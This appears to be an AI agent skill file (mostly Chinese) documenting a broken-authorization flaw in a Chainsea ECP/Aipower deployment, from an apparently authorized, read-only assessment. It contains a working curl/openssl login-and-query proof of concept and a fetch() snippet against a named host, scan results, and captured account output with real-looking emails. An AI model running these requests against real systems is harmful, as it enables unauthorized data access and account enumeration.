---
name: ecp-action-authz-gap
description: Chainsea ECP/Aipower 後端 Action 授權漏洞——任何已登入帳號都能直接呼叫任何 xxx.data Action，不受選單/身份/角色權限限制。含驗證方法、已測資料外洩範圍、與「直連API組」死路調查記錄。
triggers:
  - ecp 權限
  - action 權限
  - 直連api組
  - directapigroup
  - aipower 安全
  - ecp 安全漏洞
  - 帳號列舉
  - action 繞過
argument-hint: "[action name to test]"
---

# ECP/Aipower Action 授權缺口

## 核心發現（2026-07-01，`hch.james-huang.org` / `C:\Lab\chainsea`）

**這個 Chainsea ECP/Aipower（Quicksilver 框架）部署裡，絕大多數業務 Action（`xxx.data` 端點）只檢查「有沒有登入 session」，不檢查「這個帳號有沒有權限存取這個功能/這筆資料」。**

前端選單（`TsMenu`）、身份類型許可權（`TsIdentityPrivilege`）、角色（`TsRole`）只決定「畫面上看不看得到」，**不影響「能不能直接對後端發 HTTP 請求拿到資料」**。任何一個能登入的帳號——哪怕是刻意設成最低權限、選單上什麼都看不到的測試帳號——都能繞過前端選單直接呼叫任何存在的 Action。

這不是設定錯誤，是這批 Action 在框架層級普遍缺少後端授權檢查（Java `Action`/`Service` 類沒有做基於身份/角色的存取控制），只有極少數明確標記高風險的操作（例如直接執行 SQL）有做管理員檢查。

## 如何驗證（安全、唯讀的方式）

### 方法一：純 curl，不需要瀏覽器（已實測跑通）

登入本身要通過框架的 RSA 加密流程，但完全可以純用 curl + openssl 重現，不需要瀏覽器/Playwright：

```bash
#!/bin/bash
BASE="https://hch.james-huang.org/aipower"
COOKIE="/tmp/ecp_cookies.txt"
LOGIN_NAME="James"
PASSWORD="<DB_PASSWORD>"
PY="/c/Users/HCH/AppData/Local/Programs/Python/Python313/python"   # 換成本機真正存在的 python 路徑；Windows 上 `python3` alias 常被 Store 佔用要避開

mkdir -p /tmp/ecp_poc && cd /tmp/ecp_poc

# 1. 建立 session、拿 RSA 公鑰
curl -s -c "$COOKIE" "$BASE/Qs.OnlineUser.Login.page" -o /dev/null
PUBKEY=$(curl -s -b "$COOKIE" -c "$COOKIE" -X POST "$BASE/Qs.Misc.getLoginPublicKey.data" -d '' \
  | "$PY" -c "import sys,json; print(json.load(sys.stdin)['publicKey'])")

# 2. 組 PEM，RSA PKCS1 加密密碼（注意是 PKCS1v1.5，不是 OAEP）
{ echo "-----BEGIN PUBLIC KEY-----"; echo "$PUBKEY"; echo "-----END PUBLIC KEY-----"; } > pubkey.pem
printf '%s' "$PASSWORD" > pass.txt
openssl pkeyutl -encrypt -pubin -inkey pubkey.pem -pkeyopt rsa_padding_mode:pkcs1 -in pass.txt -out pass.enc
ENC_PASSWORD=$(base64 -w0 pass.enc)

# 3. 登入：body 是「未包 args= 的原始 JSON」，Content-Type 是 text/plain，跟一般 Action 不一樣
curl -s -b "$COOKIE" -c "$COOKIE" -X POST "$BASE/Qs.OnlineUser.login.data" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  --data-raw "{\"loginName\":\"$LOGIN_NAME\",\"password\":\"$ENC_PASSWORD\",\"language\":\"zh-tw\",\"extraArgs\":null,\"checkRelogin\":true}"
# 回傳 {}（沒有 _failed）就是登入成功

# 4. 用同一組 cookie 直接呼叫任何 Action，不需要再帶任何 token/header
ARGS=$("$PY" -c "import urllib.parse,json; print(urllib.parse.quote(json.dumps({'pageIndex':1,'pageSize':50,'showPageCount':True})))")
curl -s -b "$COOKIE" -c "$COOKIE" -X POST "$BASE/qsvd-list/Qs.Account.getListData.data" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "args=$ARGS"
```

實測回應（2026-07-01，帳號 James/<DB_PASSWORD>）：

```json
{"data":{"totalSize":2,"records":[
  {"FLoginName":"James","FEmail":"hch.new@gmail.com","FName":"James"},
  {"FLoginName":"administrator","FEmail":"hch590902@gmail.com","FName":"系統管理員"}
],...}}
```

三個容易踩雷的地方：

1. 密碼不能明文傳，要先 `POST Qs.Misc.getLoginPublicKey.data`（body 空即可）拿 RSA 公鑰，用 **PKCS1v1.5**（不是 OAEP）加密後 base64。
2. 登入請求的 body 是**未包 `args=` 的原始 JSON**、`Content-Type: text/plain;charset=UTF-8`——跟下面一般業務 Action 的 `args=<urlencoded JSON>` 格式不同，照抄一般 Action 格式會直接失敗。
3. 之後所有業務 Action 呼叫，靠 `curl -b/-c` 帶同一組 cookie jar 就直接放行，完全不用管 selectors/token。

用完記得清掉暫存目錄（`rm -rf /tmp/ecp_poc`），不要把加密密碼/cookie 檔留在磁碟上。

### 方法二：瀏覽器已登入 session（Playwright `browser_evaluate` 或 DevTools Console）

不想處理 RSA 加密，直接借用已經登入的瀏覽器 session 最快，直接 `fetch()` 呼叫 Action，不透過選單/UI：

```js
async () => {
  const res = await fetch('/aipower/<ActionName>.data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'args=' + encodeURIComponent(JSON.stringify({ /* 參數 */ }))
  });
  const text = await res.text();
  return { status: res.status, body: text.slice(0, 500) };
}
```

- 一般業務 Action：`POST /aipower/<Action>.data`，body 是 `args=<urlencoded JSON>`。
- 清單頁（`EntityList`/`qsvd-list`）Action：`POST /aipower/qsvd-list/<Action>.data`，同樣是 `args=` 格式，但**必須帶 `pageIndex`/`pageSize`/`showPageCount`**，否則常常回空清單（不是被權限擋，是查詢條件不完整，容易誤判成「安全」）。
- 少數框架級操作（如 SQL 執行）走 `Content-Type: text/plain;charset=UTF-8`，body 是**未包 `args=` 的原始 JSON**，例如 `{"dataSource":"default","sql":"..."}`。

### 找出真正的 Action 名稱

不要用猜的，用 `browser_network_requests`（Playwright MCP）過濾 `getListData` 或功能關鍵字，先用高權限帳號在 UI 上正常操作一次該功能，網路請求記錄裡就會有精確的 URL：

```
mcp__plugin_playwright_playwright__browser_network_requests({ static: false, filter: "getListData" })
mcp__plugin_playwright_playwright__browser_network_request({ index: N, part: "request-body" })
mcp__plugin_playwright_playwright__browser_network_request({ index: N, part: "request-headers" })
```

## 已驗證的曝露範圍（用最低權限帳號 James，選單上只有「辦公自動化」）

| Action | 性質 | 結果 |
|---|---|---|
| `Ecp.TimeReport.getAllDetailDatas.data` | 工時報表明細 | ✅ 成功回傳資料 |
| `qsvd-list/Qs.Role.getListData.data` | **角色/權限清單**（含系統管理、部門管理等角色定義） | ✅ **完整回傳**——一般員工完全不該看到 |
| `qsvd-list/Qs.Account.getListData.data`（帶 `pageIndex/pageSize/showPageCount`） | 帳號管理清單 | ✅ **完整回傳所有帳號**，含系統管理員的登入名稱與 Email |
| `qsvd-list/Qs.RemoteApiGroup.getListData.data` | 遠端 API 組設定（含內網 URL） | ✅ 呼叫成功 |
| `qsvd-list/Qs.TokenConfig.getListData.data` | Token 類型設定（逾時秒數等中繼資料，不含密鑰本身） | ✅ 呼叫成功 |
| `qsvd-list/Qs.SystemEmail.getListData.data` | 系統寄信記錄清單（主旨/收件人/狀態，如「密碼修改通知」「發送失敗」） | ✅ 呼叫成功——**未測試對應的單筆 `getData`**，因其很可能回傳完整信件內文（密碼重設信通常夾帶重設連結/token），已逼近等同取得密碼的範疇，故主動未驗證，僅記錄為待確認風險點 |
| `qsvd-list/Qs.RemoteApiParameter.getListData.data` | 遠端 API 呼叫參數 | 回傳空清單（0 筆），無法判斷是無資料還是被擋，需帶正確的 parent id 才能進一步判斷 |
| `Qs.ApiParameter.*` | （猜測的 Action 名稱） | 不存在此 Action（`Qs.Asd.NotExistByUnitCode`），命名猜錯，非權限問題 |

拿到系統管理員帳號的 `FLoginName`（如 `administrator`）+ `FEmail` 這件事本身就是帳號列舉（account enumeration）風險：攻擊者只要弄到任意一個能登入的帳密，就能列出所有帳號登入名，接著針對已知帳號做密碼猜測。

### 重啟後重測（2026-07-01，同一天，系統整個重啟過一次）

重啟後用 James 重測上表四個 Action，結果分成兩組：

| Action | 重啟前 | 重啟後重測 |
|---|---|---|
| `Qs.Role.getListData` | ✅ 完整回傳 | ✅ **依然完整回傳**（甚至擴增到 25 筆角色定義），完全不受影響 |
| `Qs.Account.getListData` | ✅ 完整回傳（2 筆） | ⚠️ 回傳 **0 筆**（空清單） |
| `Qs.TokenConfig.getListData` | ✅ 1 筆 | ⚠️ 回傳 **0 筆** |
| `Qs.SystemEmail.getListData` | ✅ 1 筆（「密碼修改通知」，發送失敗） | ⚠️ 回傳 **0 筆** |

曾懷疑是使用者當時手動把 James 加了一個 `api_role` 角色造成資料範圍限縮，**已排除**：加上 `api_role` 和事後刪掉 `api_role` 兩種狀態下，Account/TokenConfig/SystemEmail 三者的結果完全一樣（都是 0 筆），跟角色指派無因果關係。之後多次重新登入重測 `Qs.Account.getListData`，結果穩定維持 0 筆。

**這不是漏洞被修好，是不同層次的東西被混淆了**：

- **Action 授權（能不能呼叫這個 Action）**——這層從頭到尾沒變過，壞的還是壞的。證據就是 `Qs.Role`：呼叫完全成功，回傳完整資料，`totalSize:0` 這種空清單也不是因為被擋，回應裡沒有 `_failed`/`AdministratorRequired` 這類錯誤碼，是正常成功回應、只是資料列數是 0。
- **資料範圍（這個 Action 撈得到哪些資料列）**——Account/TokenConfig/SystemEmail 這三個很可能本來就設了「僅本人/本部門可見」之類的範圍限制，但重啟前 Registry 快取是舊的，範圍限制沒真正套用，所以撈到全部；重啟讓 Registry 重新載入後，範圍限制才真的生效，變成 0 筆。`Qs.Role` 之所以不受影響，合理推測是角色定義這種全域主檔本來就沒設任何資料範圍，不管重啟幾次都不會被過濾。

換句話說：**只要某個 Action 對應的資料沒設資料範圍，Action 授權缺口就照樣能把整包資料撈出來，不看重啟前後、不看角色指派**。Account/TokenConfig/SystemEmail 現在看不到，純屬這三張表剛好被資料範圍擋住的巧合，不代表這個授權缺口有任何系統性修復。之後要驗證某個 Action 是否安全，不能只看重啟後這次測到 0 筆就當作安全，要換一個原本就有資料的帳號/情境重測，或直接看有沒有 `_failed` 錯誤碼來判斷是「被擋」還是「查詢結果剛好是空的」。

### 唯一觀察到有效防護的操作

```
Qs.Misc.executeSql.data
```

呼叫時要求 `Content-Type: text/plain`，body 是 `{"dataSource":"default","sql":"..."}`（無 `args=` 包裝，也沒有前端傳的 `qs-pagecode` header）。非管理員呼叫會被正確擋下：

```json
{"code":"Qs.Privilege.AdministratorRequired","_failed":true,"message":"只有系統管理員才能執行該操作。"}
```

這證明框架**有能力**做後端授權檢查，只是絕大多數一般業務 Action 沒有實作這層檢查。

## 全量掃描結果（308 個候選 Action，2026-07-01）

可重複執行的腳本：[`scripts/scan_actions.py`](./scripts/scan_actions.py)（同目錄下）。改上面 CONFIG 區塊的網址/帳密/jar 路徑即可重跑，內建安全邊界（只呼叫 `getListData`、不印欄位內容、密碼走臨時目錄用完即刪）。已實測跑過一次，結果跟下面手動掃描完全一致（227 成功／15 有資料／81 失敗）。

用 `jar tf` 反推三個模組 jar（`aipower-module-base`、`aipower-module-crm`、`quicksilver-module-main`）裡所有 `*ActionImpl.class`，依套件推導出 `Ecp.<Entity>` / `Qs.<Entity>` 候選 Action 名稱（`com.chainsea.ecp.*` → `Ecp.`，`com.jeedsoft.quicksilver.*` → `Qs.`），共 308 個，用 James 逐一呼叫 `getListData`（`pageIndex:1,pageSize:1,showPageCount:true`）。**只記錄「能不能呼叫成功＋筆數」，不讀取/顯示任何欄位內容**，避免撈到真實業務個資。

批次腳本重點：登入沿用方法一的 curl+openssl RSA 流程；候選呼叫改用 Python `requests.Session` 效率較高，但**curl 存的 cookie 檔案第一欄會有 `#HttpOnly_` 前綴，Python 內建 `http.cookiejar.MozillaCookieJar` 讀不出這種格式，會靜默略過整個 cookie，導致全部請求變成「未登入」**——踩過一次坑，正確做法是手動解析 cookie 檔（去掉 `#HttpOnly_` 前綴後用 `session.cookies.set()` 塞入），不要依賴 `MozillaCookieJar.load()`。

| 分類 | 數量 | 說明 |
|---|---|---|
| ✅ 成功呼叫（無 `_failed`） | **227**（74%） | 其中 212 筆是空清單（表單存在但沒建資料），15 筆有實際資料 |
| 猜錯 Action 名稱（`Qs.Asd.NotExistByUnitCode`） | 38 | 命名猜錯，非權限問題 |
| 呼叫方式不對（`Basic.Reflect.NoMethodWithArgument` / `Basic.Json.ObjectPropertyMissing`） | 27 | Action 存在但不是標準 `getListData` 清單型，需要不同參數格式 |
| **伺服器 500 / NullPointerException** | 13 | 見下方說明 |
| 真正的權限相關錯誤（`Qs.Privilege.NotExist`） | 2 | `Qs.PageGroup`、`Qs.ReportData`，訊息是「該單元不存在查看/管理許可權」——比較像是這個環境沒設定這兩個單元的許可權項目，不是「James 被正確擋下」，跟 `Qs.Misc.executeSql` 的 `AdministratorRequired` 性質不同，不能當成框架有做授權檢查的證據 |
| 其他（`Qs.List.DefaultListNotExist`） | 1 | 設定缺失，非權限問題 |

有實際資料的 15 個（僅記錄名稱＋筆數）：`Qs.QuerySchema`(594，框架查詢結構定義，系統中繼資料非業務資料)、`Qs.Edit`(47)、`Qs.Role`(25)、`Ecp.Unit`(18)、`Ecp.DocumentCatalog`(8)、`Ecp.Currency`(8)、`Ecp.TaskMethod`(4)、`Ecp.ProductCatalog`(4)、`Ecp.CalendarSetup`(4)、`Qs.User`(2，注意跟被資料範圍擋成 0 筆的 `Qs.Account` 不同，這個目前沒被擋)、`Qs.Department`(2)、`Ecp.Product`(2)、`Ecp.ProjectMethodMilestone`(1)、`Ecp.PriceList`(1)、`Ecp.Colleague`(1)。沒有出現客戶名單/聯絡人/服務請求類的大量資料，因為這個測試租戶本來就沒建多少業務資料。

**附帶發現：13 個「頁面綁定型」Action 缺少 `qs-pagecode` context 時直接 500 + NPE，且堆疊訊息洩漏內部套件路徑**（如 `com.jeedsoft.quicksilver.page.model.PageModel`、`com.atomikos.jdbc.AbstractDataSourceBean`）。例如 `Qs.LoginLog`、`Qs.BusinessLog`、`Qs.Attachment`、`Qs.Chart`、`Qs.Deputy`、`Qs.Script`、`Qs.Version`、`Ecp.Email`、`Ecp.Response`、`Ecp.TargetCustomer`、`Ecp.TargetCustomerGroup`、`Ecp.VRM`、`Ecp.WorkSheet`。這些不是被權限擋下，是繞過選單直接呼叫時少了頁面 context 導致當掉——本身是輕量級資訊洩漏（曝露內部類別/套件結構），如果補上正確的頁面 context 呼叫方式，不排除也能正常取得資料，但這次沒有進一步驗證（超出「證明能呼叫」所需範圍）。

**結論**：227/308（74%）候選 Action 在完全沒有選單/角色權限的情況下都能被 James 成功呼叫，證實這個授權缺口是系統性、大範圍的，不是零星幾個 Action 的個案。目前沒有真實業務個資外洩，純粹是因為這個測試環境本身資料量少，如果換成有真實客戶資料的正式環境，暴露面會等比例放大到那些同名 Action 上。

## 「直連API組」死路——不要重複調查

側邊選單「資料整合 > 直連API組」（`Qs.DirectApiGroup` / `TsDirectApiGroup`）**曾被懷疑**是繞過選單權限的白名單機制，**經完整驗證後排除**：

- DB 結構：`TsDirectApiGroup`（FId, FName）→ `TsDirectApi`（FId, FPath, FDirectApiGroupId, FIndex）→ `TsRoleDirectApiGroup`（FRoleId, FDirectApiGroupId，多對多關聯表）。
- 前端只有 `quicksilver/page/integration/DirectApiGroupList.js`，內容只有「匯出」功能，**沒有專屬的呼叫/執行入口**——是標準 `EntityList` CRUD 頁面，不是一個可觸發的 API 閘道。
- 測試矩陣（未登入 / 已登入未關聯 / 已登入+角色關聯 / 兩次重啟前後）**全部行為一致**，登記進「直連API組」的路徑跟沒登記的路徑，呼叫結果沒有任何差異。
- 「身份類型」許可權（`TsIdentityPrivilege`）裡的「直連API組查看/管理」「直連API查看/管理」是**管理這個設定畫面本身的 CRUD 權限**（能不能打開/編輯這個清單頁），跟「某個 Action 呼叫能不能通過」是完全不同的兩層，不要混淆。
- 結論：這個功能在這個版本/環境目前**沒有觀察到任何實際生效的證據**，可能是半成品、未串接、或是給沒用到的外部整合流程預留（可能要搭配「Token 設定」的 API Token 呼叫方式，而非瀏覽器 session cookie 呼叫方式，但沒有找到對應的 Token 呼叫端點可驗證）。

如果之後想重新驗證，且環境允許重啟：先確認要測的路徑真的有掛進某個 Role 且該 Role 有連到目標帳號（`TsRoleDirectApiGroup` + 角色編輯畫面的「員工」子清單），再用完全沒有 session cookie 的方式呼叫（curl，不帶 cookie），而不是瀏覽器 fetch（那樣一定帶 cookie，測不出「免登入」情境）。

## 安全邊界（使用本 skill 時務必遵守）

- 只做**唯讀**驗證（`getListData` 類查詢），絕不對生產資料呼叫任何寫入/刪除類 Action。
- 不主動查詢/顯示密碼欄位（`FPassword`），即使只是 hash 也不要撈出來顯示。
- 不擴大範圍去讀取其他真實使用者的業務個資（客戶名單、聯絡資料等），示範用途只需要證明「能呼叫」，不需要窮舉資料。
- 這是**這個特定環境**（`hch.james-huang.org`，對外曝露的 Cloudflare Tunnel）的真實生產/測試環境，不是隔離的實驗室，測試前務必再次確認範圍與使用者授權。

## 建議

1. 這是產品/框架層級的設計缺陷，建議回報給 Chainsea/廠商，不是這個部署獨有的設定錯誤。
2. 短期緩解：既然選單權限管不住 Action 呼叫，`hch.james-huang.org` 這個對外網址上的每一個帳號都要當作「等同系統管理員讀取權限」來看待——弱密碼帳號、測試帳號的風險遠高於一般預期。
3. 若要驗證某個 Action 是否安全，不能只看它在選單裡藏在哪一層，要實際用低權限帳號的 session 直接呼叫測試（見上方驗證方法）。

---

## Conformance Addendum

## When to Use
Chainsea ECP/Aipower 後端 Action 授權漏洞——任何已登入帳號都能直接呼叫任何 xxx.data Action，不受選單/身份/角色權限限制。含驗證方法、已測資料外洩範圍、與「直連API組」死路調查記錄。

## Inputs and Outputs
- **Input:** the user request, relevant paths/configuration, and any current error or runtime evidence.
- **Output:** the requested result plus a concise record of actual changes and verification evidence.

## Procedure
1. Confirm the current environment and read the task-specific instructions already documented in this Skill.
2. Apply the smallest safe change that satisfies the request; confirm before destructive operations.
3. Run the checks in the Verification section and report actual results.

## Rules and Limitations
- Resolve relative paths from this Skill directory, not from an unspecified working directory.
- Treat recorded paths, versions, hosts, and UI details as potentially stale; current system evidence takes precedence.
- Do not expose credentials or perform destructive changes without explicit authorization.

## Pitfalls
- Do not guess configuration paths or claim success without checking the resulting state.
- Do not execute copied commands or scripts before reviewing their targets and side effects.

## Verification
1. Confirm the intended files, services, or outputs exist in their expected state.
2. Run the most relevant syntax, configuration, build, or runtime check available for this Skill.
3. Report what was changed, what was tested, and any remaining limitation.
